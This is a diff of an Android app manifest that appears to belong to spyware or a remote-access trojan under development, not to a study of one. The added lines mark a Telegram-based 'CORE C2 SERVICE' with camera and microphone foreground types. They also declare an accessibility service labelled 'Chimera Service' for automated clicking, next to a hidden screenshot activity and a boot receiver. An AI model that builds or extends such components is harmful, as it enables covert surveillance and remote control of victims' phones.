@@ -2,6 +2,7 @@
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
     xmlns:tools="http://schemas.android.com/tools">
 
+    <!-- All previous permissions are still needed -->
     <uses-permission android:name="android.permission.WAKE_LOCK" />
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
@@ -31,17 +32,29 @@
                 <category android:name="android.intent.category.LAUNCHER"/>
             </intent-filter>
         </activity>
-
-        <!-- ADDED: TRANSPARENT ACTIVITY FOR SCREENSHOT PERMISSION -->
         <activity
             android:name=".ScreenshotActivity"
             android:theme="@android:style/Theme.Translucent.NoTitleBar"
             android:exported="false" />
 
+        <!-- CORE C2 SERVICE -->
         <service
             android:name=".TelegramC2Service"
             android:exported="false"
             android:foregroundServiceType="dataSync|camera|microphone" />
+
+        <!-- NEW ACCESSIBILITY SERVICE DECLARATION -->
+        <service android:name=".AutoClickerAccessibilityService"
+            android:label="Chimera Service"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
+            android:exported="false">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService" />
+            </intent-filter>
+            <meta-data
+                android:name="android.accessibilityservice"
+                android:resource="@xml/accessibility_service_config" />
+        </service>
 
         <receiver
             android:name=".BootReceiver"
